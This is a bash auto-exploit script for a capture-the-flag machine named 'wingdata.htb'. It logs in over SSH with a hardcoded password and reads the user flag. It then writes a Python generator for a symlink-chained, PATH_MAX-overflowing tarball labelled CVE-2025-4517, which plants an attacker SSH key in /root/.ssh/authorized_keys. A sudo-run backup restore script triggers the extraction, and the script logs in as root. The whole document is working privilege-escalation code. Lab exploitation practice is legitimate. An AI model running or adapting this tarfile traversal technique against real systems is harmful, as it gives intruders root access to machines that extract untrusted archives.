#!/bin/bash

# ==========================================
#  WingData Auto-Exploit (CVE-2025-4517)
# ==========================================

cat << "BANNER"
  _    _  _             ____          _        
 | |  | |(_)           |  _ \        | |       
 | |  | | _  _ __    __| |_) |  __ _ | |_  ___ 
 | |/\| || || '_ \  / _` |  _ <  / _` || __|/ _ \
 \  /\  /| || | | || (_| | |_) || (_| || |_|  __/
  \/  \/ |_||_| |_| \__,_|____/  \__,_| \__|\___|
                                                 
BANNER
echo "      Coded by @goldfinch12 | BackBox Group"
echo "================================================="

TARGET="wingdata.htb"
USER="wacky"
PASS='!#7Blushing^*Bride5'

echo ""
echo "[*] Connecting to target: $USER@$TARGET"
echo "[*] Please enter password when prompted: $PASS"
echo ""

ssh -o StrictHostKeyChecking=no $USER@$TARGET 'bash -s' << 'EOF'
# --- REMOTE EXECUTION START ---
set -e

# ANSI Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo -e "${GREEN}[+] Connection established!${NC}"
echo ""

echo -e "${GREEN}=================[ USER FLAG ]=================${NC}"
cat ~/user.txt
echo -e "${GREEN}===============================================${NC}"
echo ""

echo "[*] Initializing Privilege Escalation Exploit..."

# 1. Generate SSH Key Pair
echo "[*] Generating temporary SSH keys..."
rm -f /tmp/id_rsa /tmp/id_rsa.pub
ssh-keygen -t rsa -f /tmp/id_rsa -N "" -q >/dev/null

# 2. Create Python Exploit Generator
echo "[*] Creating payload generator script..."
cat << 'PY_SCRIPT' > /tmp/exploit.py
import tarfile, os, io

try:
    with open("/tmp/id_rsa.pub", "rb") as f:
        pubkey = f.read()
except:
    print("[-] Error reading public key")
    exit(1)

# PATH_MAX Overflow Payload Construction
comp = "d" * 247
steps = "abcdefghijklmnop"
path = ""

try:
    with tarfile.open("/tmp/pwn.tar", "w") as tar:
        # Create deep directory structure
        for i in steps:
            t = tarfile.TarInfo(os.path.join(path, comp))
            t.type = tarfile.DIRTYPE
            tar.addfile(t)
            l = tarfile.TarInfo(os.path.join(path, i))
            l.type = tarfile.SYMTYPE
            l.linkname = comp
            tar.addfile(l)
            path = os.path.join(path, comp)

        # Create overflow link (PATH_MAX bypass)
        linkpath = os.path.join("/".join(steps), "l"*254)
        l = tarfile.TarInfo(linkpath)
        l.type = tarfile.SYMTYPE
        l.linkname = "../" * len(steps)
        tar.addfile(l)

        # Symlink pointing to /root/.ssh
        ssh_dir = tarfile.TarInfo("ssh_dir")
        ssh_dir.type = tarfile.SYMTYPE
        ssh_dir.linkname = linkpath + "/../../../../../root/.ssh"
        tar.addfile(ssh_dir)

        # Authorized_keys file to inject
        ak = tarfile.TarInfo("ssh_dir/authorized_keys")
        ak.type = tarfile.REGTYPE
        ak.mode = 0o600
        ak.size = len(pubkey)
        tar.addfile(ak, fileobj=io.BytesIO(pubkey))
        
    print("[+] Malicious tarball created.")
except Exception as e:
    print(f"[-] Generation failed: {e}")
    exit(1)
PY_SCRIPT

# 3. Execute Generator & Move Payload
python3 /tmp/exploit.py
mv /tmp/pwn.tar /opt/backup_clients/backups/backup_1337.tar

# 4. Trigger Vulnerability
echo "[*] Triggering CVE-2025-4517 via sudo..."
# We expect errors due to the extraction failure, so we suppress them or allow failure
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1337.tar -r restore_pwn >/dev/null 2>&1 || true

echo ""
echo -e "${GREEN}=================[ ROOT FLAG ]=================${NC}"
# SSH to localhost as root using the injected key
ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost "cat /root/root.txt"
echo -e "${GREEN}===============================================${NC}"

# Cleanup
rm -f /tmp/id_rsa /tmp/id_rsa.pub /tmp/exploit.py /opt/backup_clients/backups/backup_1337.tar
echo ""
echo "[*] Exploit complete. Cleaning up..."
EOF
